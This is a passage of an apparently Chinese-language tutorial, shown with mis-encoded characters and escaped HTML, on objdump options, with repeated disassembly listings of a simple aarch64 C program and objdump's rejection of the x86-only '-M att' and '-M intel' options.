    Êú¨ÈÅ∏È†ÖÊúÉÂæÆÂ¶ôÁöÑÂΩ±ÈüøÁ®ãÂºèÁ¢ºÁâáÊÆµÁöÑÂèçÂΩôÁ∑®„ÄÇÁï∂‰ΩøÁî®-dÈÅ∏È†ÖÁöÑÊôÇÂÄôÔºåobjdumpÊúÉÂÅáË®≠‰ª£Á¢º‰∏≠Âá∫ÁèæÁöÑÊâÄÊúâsymbolsÈÉΩÂú®Â∞çÊáâ
    ÁöÑboundaryÁØÑÂúç‰πãÂÖßÔºå‰∏¶‰∏î‰∏çÊúÉË∑®boundary‰æÜÈÄ≤Ë°åÂèçÂΩôÁ∑®Ôºõ ËÄåÁï∂‰ΩøÁî®-DÈÅ∏È†ÖÊôÇÔºåÂâá‰∏¶‰∏çÊúÉÊúâÈÄôÊ®£ÁöÑÂÅáË®≠„ÄÇÈÄôÂ∞±
    ÊÑèÂë≥Ëëó-dËàá-DÈÅ∏È†ÖÂú®ÂèçÂΩôÁ∑®ÊôÇÔºåÂèØËÉΩËº∏Âá∫ÁµêÊûúÊúÉÊúâ‰∫õ‰∏çÂêåÔºåÊØîÂ¶ÇÁï∂Ë≥áÊñôÂ≠òÊîæÂú®Á®ãÂºèÁ¢ºÁâáÊÆµÁöÑÊÉÖÊ≥Å‰∏ã„ÄÇ
-S È°ØÁ§∫ÂéüÂßãÁ¢ºÂíåÂèçÁµÑË≠ØÁ®ãÂºèÁ¢º(ÂåÖÂê´Ôºçd ÂèÉÊï∏)
--prefix-addresses
    ÂèçÂΩôÁ∑®ÁöÑÊôÇÂÄôÔºåÈ°ØÁ§∫ÊØè‰∏ÄË°åÁöÑÂÆåÊï¥‰ΩçÂùÄ„ÄÇÈÄôÊòØ‰∏ÄÁ®ÆÊØîËºÉËÄÅÁöÑÂèçÂΩôÁ∑®Ê†ºÂºè
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;ÁØÑ‰æã1&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Á∑®Ë≠Ø &lt;code&gt;gcc -o PLAYGROUND PLAYGROUND.c -g&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÂèçÁ∑®Ë≠Ø1(‰ΩøÁî®attÊ†ºÂºè) ==&amp;gt; &lt;code&gt;objdump -S PLAYGROUND&lt;/code&gt; (È†êË®≠:‰ΩøÁî®AT&amp;amp;TË™ûÊ≥ï)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;ÁµêÊûú1&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;yih@yih:~/Documents/C$ objdump -S PLAYGROUND

PLAYGROUND:     file format elf64-littleaarch64

Disassembly of section .init:

00000000000005b8 &amp;lt;_init&amp;gt;:
 5b8:    d503201f     nop
 5bc:    a9bf7bfd     stp    x29, x30, [sp, #-16]!
 5c0:    910003fd     mov    x29, sp
 5c4:    9400002c     bl    674 &amp;lt;call_weak_fn&amp;gt;
 5c8:    a8c17bfd     ldp    x29, x30, [sp], #16
 5cc:    d65f03c0     ret

Disassembly of section .plt:

00000000000005d0 &amp;lt;.plt&amp;gt;:
 5d0:    a9bf7bf0     stp    x16, x30, [sp, #-16]!
 5d4:    90000090     adrp    x16, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 5d8:    f947d211     ldr    x17, [x16, #4000]
 5dc:    913e8210     add    x16, x16, #0xfa0
 5e0:    d61f0220     br    x17
 5e4:    d503201f     nop
 5e8:    d503201f     nop
 5ec:    d503201f     nop

00000000000005f0 &amp;lt;__libc_start_main@plt&amp;gt;:
 5f0:    90000090     adrp    x16, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 5f4:    f947d611     ldr    x17, [x16, #4008]
 5f8:    913ea210     add    x16, x16, #0xfa8
 5fc:    d61f0220     br    x17

0000000000000600 &amp;lt;__cxa_finalize@plt&amp;gt;:
 600:    90000090     adrp    x16, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 604:    f947da11     ldr    x17, [x16, #4016]
 608:    913ec210     add    x16, x16, #0xfb0
 60c:    d61f0220     br    x17

0000000000000610 &amp;lt;__gmon_start__@plt&amp;gt;:
 610:    90000090     adrp    x16, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 614:    f947de11     ldr    x17, [x16, #4024]
 618:    913ee210     add    x16, x16, #0xfb8
 61c:    d61f0220     br    x17

0000000000000620 &amp;lt;abort@plt&amp;gt;:
 620:    90000090     adrp    x16, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 624:    f947e211     ldr    x17, [x16, #4032]
 628:    913f0210     add    x16, x16, #0xfc0
 62c:    d61f0220     br    x17

0000000000000630 &amp;lt;puts@plt&amp;gt;:
 630:    90000090     adrp    x16, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 634:    f947e611     ldr    x17, [x16, #4040]
 638:    913f2210     add    x16, x16, #0xfc8
 63c:    d61f0220     br    x17

Disassembly of section .text:

0000000000000640 &amp;lt;_start&amp;gt;:
 640:    d503201f     nop
 644:    d280001d     mov    x29, #0x0                       // #0
 648:    d280001e     mov    x30, #0x0                       // #0
 64c:    aa0003e5     mov    x5, x0
 650:    f94003e1     ldr    x1, [sp]
 654:    910023e2     add    x2, sp, #0x8
 658:    910003e6     mov    x6, sp
 65c:    90000080     adrp    x0, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 660:    f947f800     ldr    x0, [x0, #4080]
 664:    d2800003     mov    x3, #0x0                       // #0
 668:    d2800004     mov    x4, #0x0                       // #0
 66c:    97ffffe1     bl    5f0 &amp;lt;__libc_start_main@plt&amp;gt;
 670:    97ffffec     bl    620 &amp;lt;abort@plt&amp;gt;

0000000000000674 &amp;lt;call_weak_fn&amp;gt;:
 674:    90000080     adrp    x0, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 678:    f947f400     ldr    x0, [x0, #4072]
 67c:    b4000040     cbz    x0, 684 &amp;lt;call_weak_fn+0x10&amp;gt;
 680:    17ffffe4     b    610 &amp;lt;__gmon_start__@plt&amp;gt;
 684:    d65f03c0     ret
 688:    d503201f     nop
 68c:    d503201f     nop

0000000000000690 &amp;lt;deregister_tm_clones&amp;gt;:
 690:    b0000080     adrp    x0, 11000 &amp;lt;__data_start&amp;gt;
 694:    91004000     add    x0, x0, #0x10
 698:    b0000081     adrp    x1, 11000 &amp;lt;__data_start&amp;gt;
 69c:    91004021     add    x1, x1, #0x10
 6a0:    eb00003f     cmp    x1, x0
 6a4:    540000c0     b.eq    6bc &amp;lt;deregister_tm_clones+0x2c&amp;gt;  // b.none
 6a8:    90000081     adrp    x1, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 6ac:    f947ec21     ldr    x1, [x1, #4056]
 6b0:    b4000061     cbz    x1, 6bc &amp;lt;deregister_tm_clones+0x2c&amp;gt;
 6b4:    aa0103f0     mov    x16, x1
 6b8:    d61f0200     br    x16
 6bc:    d65f03c0     ret

00000000000006c0 &amp;lt;register_tm_clones&amp;gt;:
 6c0:    b0000080     adrp    x0, 11000 &amp;lt;__data_start&amp;gt;
 6c4:    91004000     add    x0, x0, #0x10
 6c8:    b0000081     adrp    x1, 11000 &amp;lt;__data_start&amp;gt;
 6cc:    91004021     add    x1, x1, #0x10
 6d0:    cb000021     sub    x1, x1, x0
 6d4:    d37ffc22     lsr    x2, x1, #63
 6d8:    8b810c41     add    x1, x2, x1, asr #3
 6dc:    9341fc21     asr    x1, x1, #1
 6e0:    b40000c1     cbz    x1, 6f8 &amp;lt;register_tm_clones+0x38&amp;gt;
 6e4:    90000082     adrp    x2, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 6e8:    f947fc42     ldr    x2, [x2, #4088]
 6ec:    b4000062     cbz    x2, 6f8 &amp;lt;register_tm_clones+0x38&amp;gt;
 6f0:    aa0203f0     mov    x16, x2
 6f4:    d61f0200     br    x16
 6f8:    d65f03c0     ret
 6fc:    d503201f     nop

0000000000000700 &amp;lt;__do_global_dtors_aux&amp;gt;:
 700:    a9be7bfd     stp    x29, x30, [sp, #-32]!
 704:    910003fd     mov    x29, sp
 708:    f9000bf3     str    x19, [sp, #16]
 70c:    b0000093     adrp    x19, 11000 &amp;lt;__data_start&amp;gt;
 710:    39404260     ldrb    w0, [x19, #16]
 714:    35000140     cbnz    w0, 73c &amp;lt;__do_global_dtors_aux+0x3c&amp;gt;
 718:    90000080     adrp    x0, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 71c:    f947f000     ldr    x0, [x0, #4064]
 720:    b4000080     cbz    x0, 730 &amp;lt;__do_global_dtors_aux+0x30&amp;gt;
 724:    b0000080     adrp    x0, 11000 &amp;lt;__data_start&amp;gt;
 728:    f9400400     ldr    x0, [x0, #8]
 72c:    97ffffb5     bl    600 &amp;lt;__cxa_finalize@plt&amp;gt;
 730:    97ffffd8     bl    690 &amp;lt;deregister_tm_clones&amp;gt;
 734:    52800020     mov    w0, #0x1                       // #1
 738:    39004260     strb    w0, [x19, #16]
 73c:    f9400bf3     ldr    x19, [sp, #16]
 740:    a8c27bfd     ldp    x29, x30, [sp], #32
 744:    d65f03c0     ret
 748:    d503201f     nop
 74c:    d503201f     nop

0000000000000750 &amp;lt;frame_dummy&amp;gt;:
 750:    17ffffdc     b    6c0 &amp;lt;register_tm_clones&amp;gt;

0000000000000754 &amp;lt;main&amp;gt;:
//PLAYGROUND.c
#include &amp;lt;stdio.h&amp;gt;
int main(){
 754:    a9bf7bfd     stp    x29, x30, [sp, #-16]!
 758:    910003fd     mov    x29, sp
   printf(&amp;quot;Wu YiHung\n&amp;quot;);
 75c:    90000000     adrp    x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 760:    911e4000     add    x0, x0, #0x790
 764:    97ffffb3     bl    630 &amp;lt;puts@plt&amp;gt;
   return 0;
 768:    52800000     mov    w0, #0x0                       // #0
}
 76c:    a8c17bfd     ldp    x29, x30, [sp], #16
 770:    d65f03c0     ret

Disassembly of section .fini:

0000000000000774 &amp;lt;_fini&amp;gt;:
 774:    d503201f     nop
 778:    a9bf7bfd     stp    x29, x30, [sp, #-16]!
 77c:    910003fd     mov    x29, sp
 780:    a8c17bfd     ldp    x29, x30, [sp], #16
 784:    d65f03c0     ret
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÂèçÁ∑®Ë≠Ø2(‰ΩøÁî®attÊ†ºÂºè) ==&amp;gt;&lt;code&gt;objdump -S -M att PLAYGROUND&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;ÁµêÊûú2&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;yih@yih:~/Documents/C$ objdump -S -M att PLAYGROUND

PLAYGROUND:     file format elf64-littleaarch64

Disassembly of section .init:

00000000000005b8 &amp;lt;_init&amp;gt;:
 5b8:    objdump: unrecognised disassembler option: att
d503201f     nop
 5bc:    a9bf7bfd     stp    x29, x30, [sp, #-16]!
 5c0:    910003fd     mov    x29, sp
 5c4:    9400002c     bl    674 &amp;lt;call_weak_fn&amp;gt;
 5c8:    a8c17bfd     ldp    x29, x30, [sp], #16
 5cc:    d65f03c0     ret

Disassembly of section .plt:

00000000000005d0 &amp;lt;.plt&amp;gt;:
 5d0:    a9bf7bf0     stp    x16, x30, [sp, #-16]!
 5d4:    90000090     adrp    x16, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 5d8:    f947d211     ldr    x17, [x16, #4000]
 5dc:    913e8210     add    x16, x16, #0xfa0
 5e0:    d61f0220     br    x17
 5e4:    d503201f     nop
 5e8:    d503201f     nop
 5ec:    d503201f     nop

00000000000005f0 &amp;lt;__libc_start_main@plt&amp;gt;:
 5f0:    90000090     adrp    x16, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 5f4:    f947d611     ldr    x17, [x16, #4008]
 5f8:    913ea210     add    x16, x16, #0xfa8
 5fc:    d61f0220     br    x17

0000000000000600 &amp;lt;__cxa_finalize@plt&amp;gt;:
 600:    90000090     adrp    x16, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 604:    f947da11     ldr    x17, [x16, #4016]
 608:    913ec210     add    x16, x16, #0xfb0
 60c:    d61f0220     br    x17

0000000000000610 &amp;lt;__gmon_start__@plt&amp;gt;:
 610:    90000090     adrp    x16, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 614:    f947de11     ldr    x17, [x16, #4024]
 618:    913ee210     add    x16, x16, #0xfb8
 61c:    d61f0220     br    x17

0000000000000620 &amp;lt;abort@plt&amp;gt;:
 620:    90000090     adrp    x16, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 624:    f947e211     ldr    x17, [x16, #4032]
 628:    913f0210     add    x16, x16, #0xfc0
 62c:    d61f0220     br    x17

0000000000000630 &amp;lt;puts@plt&amp;gt;:
 630:    90000090     adrp    x16, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 634:    f947e611     ldr    x17, [x16, #4040]
 638:    913f2210     add    x16, x16, #0xfc8
 63c:    d61f0220     br    x17

Disassembly of section .text:

0000000000000640 &amp;lt;_start&amp;gt;:
 640:    d503201f     nop
 644:    d280001d     mov    x29, #0x0                       // #0
 648:    d280001e     mov    x30, #0x0                       // #0
 64c:    aa0003e5     mov    x5, x0
 650:    f94003e1     ldr    x1, [sp]
 654:    910023e2     add    x2, sp, #0x8
 658:    910003e6     mov    x6, sp
 65c:    90000080     adrp    x0, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 660:    f947f800     ldr    x0, [x0, #4080]
 664:    d2800003     mov    x3, #0x0                       // #0
 668:    d2800004     mov    x4, #0x0                       // #0
 66c:    97ffffe1     bl    5f0 &amp;lt;__libc_start_main@plt&amp;gt;
 670:    97ffffec     bl    620 &amp;lt;abort@plt&amp;gt;

0000000000000674 &amp;lt;call_weak_fn&amp;gt;:
 674:    90000080     adrp    x0, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 678:    f947f400     ldr    x0, [x0, #4072]
 67c:    b4000040     cbz    x0, 684 &amp;lt;call_weak_fn+0x10&amp;gt;
 680:    17ffffe4     b    610 &amp;lt;__gmon_start__@plt&amp;gt;
 684:    d65f03c0     ret
 688:    d503201f     nop
 68c:    d503201f     nop

0000000000000690 &amp;lt;deregister_tm_clones&amp;gt;:
 690:    b0000080     adrp    x0, 11000 &amp;lt;__data_start&amp;gt;
 694:    91004000     add    x0, x0, #0x10
 698:    b0000081     adrp    x1, 11000 &amp;lt;__data_start&amp;gt;
 69c:    91004021     add    x1, x1, #0x10
 6a0:    eb00003f     cmp    x1, x0
 6a4:    540000c0     b.eq    6bc &amp;lt;deregister_tm_clones+0x2c&amp;gt;  // b.none
 6a8:    90000081     adrp    x1, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 6ac:    f947ec21     ldr    x1, [x1, #4056]
 6b0:    b4000061     cbz    x1, 6bc &amp;lt;deregister_tm_clones+0x2c&amp;gt;
 6b4:    aa0103f0     mov    x16, x1
 6b8:    d61f0200     br    x16
 6bc:    d65f03c0     ret

00000000000006c0 &amp;lt;register_tm_clones&amp;gt;:
 6c0:    b0000080     adrp    x0, 11000 &amp;lt;__data_start&amp;gt;
 6c4:    91004000     add    x0, x0, #0x10
 6c8:    b0000081     adrp    x1, 11000 &amp;lt;__data_start&amp;gt;
 6cc:    91004021     add    x1, x1, #0x10
 6d0:    cb000021     sub    x1, x1, x0
 6d4:    d37ffc22     lsr    x2, x1, #63
 6d8:    8b810c41     add    x1, x2, x1, asr #3
 6dc:    9341fc21     asr    x1, x1, #1
 6e0:    b40000c1     cbz    x1, 6f8 &amp;lt;register_tm_clones+0x38&amp;gt;
 6e4:    90000082     adrp    x2, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 6e8:    f947fc42     ldr    x2, [x2, #4088]
 6ec:    b4000062     cbz    x2, 6f8 &amp;lt;register_tm_clones+0x38&amp;gt;
 6f0:    aa0203f0     mov    x16, x2
 6f4:    d61f0200     br    x16
 6f8:    d65f03c0     ret
 6fc:    d503201f     nop

0000000000000700 &amp;lt;__do_global_dtors_aux&amp;gt;:
 700:    a9be7bfd     stp    x29, x30, [sp, #-32]!
 704:    910003fd     mov    x29, sp
 708:    f9000bf3     str    x19, [sp, #16]
 70c:    b0000093     adrp    x19, 11000 &amp;lt;__data_start&amp;gt;
 710:    39404260     ldrb    w0, [x19, #16]
 714:    35000140     cbnz    w0, 73c &amp;lt;__do_global_dtors_aux+0x3c&amp;gt;
 718:    90000080     adrp    x0, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 71c:    f947f000     ldr    x0, [x0, #4064]
 720:    b4000080     cbz    x0, 730 &amp;lt;__do_global_dtors_aux+0x30&amp;gt;
 724:    b0000080     adrp    x0, 11000 &amp;lt;__data_start&amp;gt;
 728:    f9400400     ldr    x0, [x0, #8]
 72c:    97ffffb5     bl    600 &amp;lt;__cxa_finalize@plt&amp;gt;
 730:    97ffffd8     bl    690 &amp;lt;deregister_tm_clones&amp;gt;
 734:    52800020     mov    w0, #0x1                       // #1
 738:    39004260     strb    w0, [x19, #16]
 73c:    f9400bf3     ldr    x19, [sp, #16]
 740:    a8c27bfd     ldp    x29, x30, [sp], #32
 744:    d65f03c0     ret
 748:    d503201f     nop
 74c:    d503201f     nop

0000000000000750 &amp;lt;frame_dummy&amp;gt;:
 750:    17ffffdc     b    6c0 &amp;lt;register_tm_clones&amp;gt;

0000000000000754 &amp;lt;main&amp;gt;:
//PLAYGROUND.c
#include &amp;lt;stdio.h&amp;gt;
int main(){
 754:    a9bf7bfd     stp    x29, x30, [sp, #-16]!
 758:    910003fd     mov    x29, sp
   printf(&amp;quot;Wu YiHung\n&amp;quot;);
 75c:    90000000     adrp    x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 760:    911e4000     add    x0, x0, #0x790
 764:    97ffffb3     bl    630 &amp;lt;puts@plt&amp;gt;
   return 0;
 768:    52800000     mov    w0, #0x0                       // #0
}
 76c:    a8c17bfd     ldp    x29, x30, [sp], #16
 770:    d65f03c0     ret

Disassembly of section .fini:

0000000000000774 &amp;lt;_fini&amp;gt;:
 774:    d503201f     nop
 778:    a9bf7bfd     stp    x29, x30, [sp, #-16]!
 77c:    910003fd     mov    x29, sp
 780:    a8c17bfd     ldp    x29, x30, [sp], #16
 784:    d65f03c0     ret
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÂèçÁ∑®Ë≠Ø3(‰ΩøÁî®intelÊ†ºÂºè) ==&amp;gt;&lt;code&gt;objdump -S -M intel PLAYGROUND&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;ÁµêÊûú3&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;yih@yih:~/Documents/C$ objdump -S -M intel PLAYGROUND

PLAYGROUND:     file format elf64-littleaarch64

Disassembly of section .init:

00000000000005b8 &amp;lt;_init&amp;gt;:
 5b8:    objdump: unrecognised disassembler option: intel
d503201f     nop
 5bc:    a9bf7bfd     stp    x29, x30, [sp, #-16]!
 5c0:    910003fd     mov    x29, sp
 5c4:    9400002c     bl    674 &amp;lt;call_weak_fn&amp;gt;
 5c8:    a8c17bfd     ldp    x29, x30, [sp], #16
 5cc:    d65f03c0     ret

Disassembly of section .plt:

00000000000005d0 &amp;lt;.plt&amp;gt;:
 5d0:    a9bf7bf0     stp    x16, x30, [sp, #-16]!
 5d4:    90000090     adrp    x16, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 5d8:    f947d211     ldr    x17, [x16, #4000]
 5dc:    913e8210     add    x16, x16, #0xfa0
 5e0:    d61f0220     br    x17
 5e4:    d503201f     nop
 5e8:    d503201f     nop
 5ec:    d503201f     nop

00000000000005f0 &amp;lt;__libc_start_main@plt&amp;gt;:
 5f0:    90000090     adrp    x16, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 5f4:    f947d611     ldr    x17, [x16, #4008]
 5f8:    913ea210     add    x16, x16, #0xfa8
 5fc:    d61f0220     br    x17

0000000000000600 &amp;lt;__cxa_finalize@plt&amp;gt;:
 600:    90000090     adrp    x16, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 604:    f947da11     ldr    x17, [x16, #4016]
 608:    913ec210     add    x16, x16, #0xfb0
 60c:    d61f0220     br    x17

0000000000000610 &amp;lt;__gmon_start__@plt&amp;gt;:
 610:    90000090     adrp    x16, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 614:    f947de11     ldr    x17, [x16, #4024]
 618:    913ee210     add    x16, x16, #0xfb8
 61c:    d61f0220     br    x17

0000000000000620 &amp;lt;abort@plt&amp;gt;:
 620:    90000090     adrp    x16, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 624:    f947e211     ldr    x17, [x16, #4032]
 628:    913f0210     add    x16, x16, #0xfc0
 62c:    d61f0220     br    x17

0000000000000630 &amp;lt;puts@plt&amp;gt;:
 630:    90000090     adrp    x16, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 634:    f947e611     ldr    x17, [x16, #4040]
 638:    913f2210     add    x16, x16, #0xfc8
 63c:    d61f0220     br    x17

Disassembly of section .text:

0000000000000640 &amp;lt;_start&amp;gt;:
 640:    d503201f     nop
 644:    d280001d     mov    x29, #0x0                       // #0
 648:    d280001e     mov    x30, #0x0                       // #0
 64c:    aa0003e5     mov    x5, x0
 650:    f94003e1     ldr    x1, [sp]
 654:    910023e2     add    x2, sp, #0x8
 658:    910003e6     mov    x6, sp
 65c:    90000080     adrp    x0, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 660:    f947f800     ldr    x0, [x0, #4080]
 664:    d2800003     mov    x3, #0x0                       // #0
 668:    d2800004     mov    x4, #0x0                       // #0
 66c:    97ffffe1     bl    5f0 &amp;lt;__libc_start_main@plt&amp;gt;
 670:    97ffffec     bl    620 &amp;lt;abort@plt&amp;gt;
0000000000000674 &amp;lt;call_weak_fn&amp;gt;:
 674:    90000080     adrp    x0, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 678:    f947f400     ldr    x0, [x0, #4072]
 67c:    b4000040     cbz    x0, 684 &amp;lt;call_weak_fn+0x10&amp;gt;
 680:    17ffffe4     b    610 &amp;lt;__gmon_start__@plt&amp;gt;
 684:    d65f03c0     ret
 688:    d503201f     nop
 68c:    d503201f     nop

0000000000000690 &amp;lt;deregister_tm_clones&amp;gt;:
 690:    b0000080     adrp    x0, 11000 &amp;lt;__data_start&amp;gt;
 694:    91004000     add    x0, x0, #0x10
 698:    b0000081     adrp    x1, 11000 &amp;lt;__data_start&amp;gt;
 69c:    91004021     add    x1, x1, #0x10
 6a0:    eb00003f     cmp    x1, x0
 6a4:    540000c0     b.eq    6bc &amp;lt;deregister_tm_clones+0x2c&amp;gt;  // b.none
 6a8:    90000081     adrp    x1, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 6ac:    f947ec21     ldr    x1, [x1, #4056]
 6b0:    b4000061     cbz    x1, 6bc &amp;lt;deregister_tm_clones+0x2c&amp;gt;
 6b4:    aa0103f0     mov    x16, x1
 6b8:    d61f0200     br    x16
 6bc:    d65f03c0     ret

00000000000006c0 &amp;lt;register_tm_clones&amp;gt;:
 6c0:    b0000080     adrp    x0, 11000 &amp;lt;__data_start&amp;gt;
 6c4:    91004000     add    x0, x0, #0x10
 6c8:    b0000081     adrp    x1, 11000 &amp;lt;__data_start&amp;gt;
 6cc:    91004021     add    x1, x1, #0x10
 6d0:    cb000021     sub    x1, x1, x0
 6d4:    d37ffc22     lsr    x2, x1, #63
 6d8:    8b810c41     add    x1, x2, x1, asr #3
 6dc:    9341fc21     asr    x1, x1, #1
 6e0:    b40000c1     cbz    x1, 6f8 &amp;lt;register_tm_clones+0x38&amp;gt;
 6e4:    90000082     adrp    x2, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 6e8:    f947fc42     ldr    x2, [x2, #4088]
 6ec:    b4000062     cbz    x2, 6f8 &amp;lt;register_tm_clones+0x38&amp;gt;
 6f0:    aa0203f0     mov    x16, x2
 6f4:    d61f0200     br    x16
 6f8:    d65f03c0     ret
 6fc:    d503201f     nop

0000000000000700 &amp;lt;__do_global_dtors_aux&amp;gt;:
 700:    a9be7bfd     stp    x29, x30, [sp, #-32]!
 704:    910003fd     mov    x29, sp
 708:    f9000bf3     str    x19, [sp, #16]
 70c:    b0000093     adrp    x19, 11000 &amp;lt;__data_start&amp;gt;
 710:    39404260     ldrb    w0, [x19, #16]
 714:    35000140     cbnz    w0, 73c &amp;lt;__do_global_dtors_aux+0x3c&amp;gt;
 718:    90000080     adrp    x0, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 71c:    f947f000     ldr    x0, [x0, #4064]
 720:    b4000080     cbz    x0, 730 &amp;lt;__do_global_dtors_aux+0x30&amp;gt;
 724:    b0000080     adrp    x0, 11000 &amp;lt;__data_start&amp;gt;
 728:    f9400400     ldr    x0, [x0, #8]
 72c:    97ffffb5     bl    600 &amp;lt;__cxa_finalize@plt&amp;gt;
 730:    97ffffd8     bl    690 &amp;lt;deregister_tm_clones&amp;gt;
 734:    52800020     mov    w0, #0x1                       // #1
 738:    39004260     strb    w0, [x19, #16]
 73c:    f9400bf3     ldr    x19, [sp, #16]
 740:    a8c27bfd     ldp    x29, x30, [sp], #32
 744:    d65f03c0     ret
 748:    d503201f     nop
 74c:    d503201f     nop

0000000000000750 &amp;lt;frame_dummy&amp;gt;:
 750:    17ffffdc     b    6c0 &amp;lt;register_tm_clones&amp;gt;

0000000000000754 &amp;lt;main&amp;gt;:
//PLAYGROUND.c
#include &amp;lt;stdio.h&amp;gt;
int main(){
 754:    a9bf7bfd     stp    x29, x30, [sp, #-16]!
 758:    910003fd     mov    x29, sp
   printf(&amp;quot;Wu YiHung\n&amp;quot;);
 75c:    90000000     adrp    x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 760:    911e4000     add    x0, x0, #0x790
 764:    97ffffb3     bl    630 &amp;lt;puts@plt&amp;gt;
   return 0;
 768:    52800000     mov    w0, #0x0                       // #0
}
 76c:    a8c17bfd     ldp    x29, x30, [sp], #16
 770:    d65f03c0     ret

Disassembly of section .fini:

0000000000000774 &amp;lt;_fini&amp;gt;:
 774:    d503201f     nop
 778:    a9bf7bfd     stp    x29, x30, [sp, #-16]!
 77c:    910003fd     mov    x29, sp
 780:    a8c17bfd     ldp    x29, x30, [sp], #16
 784:    d65f03c0     ret
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÂèçÁ∑®Ë≠Ø4 ==&amp;gt; &lt;code&gt;objdump -S -j .text -M intel PLAYGROUND&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;ÁµêÊûú4&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;yih@yih:~/Documents/C$ objdump -S -j .text -M intel PLAYGROUND

PLAYGROUND:     file format elf64-littleaarch64

Disassembly of section .text:

0000000000000640 &amp;lt;_start&amp;gt;:
 640:    objdump: unrecognised disassembler option: intel
d503201f     nop
 644:    d280001d     mov    x29, #0x0                       // #0
 648:    d280001e     mov    x30, #0x0                       // #0
 64c:    aa0003e5     mov    x5, x0
 650:    f94003e1     ldr    x1, [sp]
 654:    910023e2     add    x2, sp, #0x8
 658:    910003e6     mov    x6, sp
 65c:    90000080     adrp    x0, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 660:    f947f800     ldr    x0, [x0, #4080]
 664:    d2800003     mov    x3, #0x0                       // #0
 668:    d2800004     mov    x4, #0x0                       // #0
 66c:    97ffffe1     bl    5f0 &amp;lt;__libc_start_main@plt&amp;gt;
 670:    97ffffec     bl    620 &amp;lt;abort@plt&amp;gt;

0000000000000674 &amp;lt;call_weak_fn&amp;gt;:
 674:    90000080     adrp    x0, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 678:    f947f400     ldr    x0, [x0, #4072]
 67c:    b4000040     cbz    x0, 684 &amp;lt;call_weak_fn+0x10&amp;gt;
 680:    17ffffe4     b    610 &amp;lt;__gmon_start__@plt&amp;gt;
 684:    d65f03c0     ret
 688:    d503201f     nop
 68c:    d503201f     nop

0000000000000690 &amp;lt;deregister_tm_clones&amp;gt;:
 690:    b0000080     adrp    x0, 11000 &amp;lt;__data_start&amp;gt;
 694:    91004000     add    x0, x0, #0x10
 698:    b0000081     adrp    x1, 11000 &amp;lt;__data_start&amp;gt;
 69c:    91004021     add    x1, x1, #0x10
 6a0:    eb00003f     cmp    x1, x0
 6a4:    540000c0     b.eq    6bc &amp;lt;deregister_tm_clones+0x2c&amp;gt;  // b.none
 6a8:    90000081     adrp    x1, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 6ac:    f947ec21     ldr    x1, [x1, #4056]
 6b0:    b4000061     cbz    x1, 6bc &amp;lt;deregister_tm_clones+0x2c&amp;gt;
 6b4:    aa0103f0     mov    x16, x1
 6b8:    d61f0200     br    x16
 6bc:    d65f03c0     ret

00000000000006c0 &amp;lt;register_tm_clones&amp;gt;:
 6c0:    b0000080     adrp    x0, 11000 &amp;lt;__data_start&amp;gt;
 6c4:    91004000     add    x0, x0, #0x10
